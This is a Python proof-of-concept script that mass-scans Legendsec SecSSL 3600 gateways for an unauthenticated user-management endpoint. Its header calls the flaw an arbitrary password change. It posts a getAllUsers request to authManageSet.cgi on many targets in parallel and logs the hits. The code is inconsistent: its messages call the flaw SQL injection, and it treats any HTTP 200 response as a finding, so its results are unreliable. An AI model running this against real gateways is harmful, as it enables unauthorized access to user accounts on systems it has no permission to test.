# 网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 POC
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """     ____            ____ ____  _       _____  __    ___   ___  
 / ___|  ___  ___/ ___/ ___|| |     |___ / / /_  / _ \ / _ \ 
 \___ \ / _ \/ __\___ \___ \| |       |_ \| '_ \| | | | | | |
  ___) |  __/ (__ ___) |__) | |___   ___) | (_) | |_| | |_| |
 |____/ \___|\___|____/____/|_____| |____/ \___/ \___/ \___/                                                                                                          
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞 ")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/cgi-bin/authUser/authManageSet.cgi'
    url = target + payload_url
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
    }
    data = {
        'type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 200:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该站点:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()